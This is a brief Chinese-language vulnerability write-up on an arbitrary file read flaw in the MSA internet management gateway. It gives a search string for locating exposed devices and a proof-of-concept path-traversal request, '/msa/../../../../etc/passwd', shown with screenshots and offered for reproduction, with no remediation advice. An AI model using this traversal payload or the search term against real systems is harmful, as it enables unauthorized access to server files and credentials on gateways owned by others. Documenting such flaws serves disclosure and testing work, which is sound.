# MSA 互联网管理网关 msa 任意文件下载漏洞

## 漏洞描述

MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

## 漏洞影响

<a-checkbox checked>MSA 互联网管理网关</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"互联网管理网关"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628845284708-f3f1c3ed-387c-49d6-a817-c1a8264fda2e.png)

验证POC

```php
/msa/../../../../etc/passwd
```

![img](../../../.vuepress/public/img/1628845414925-23bff98f-8fb8-4fee-aee6-cd981973b368.png)



若有收获，就点个赞吧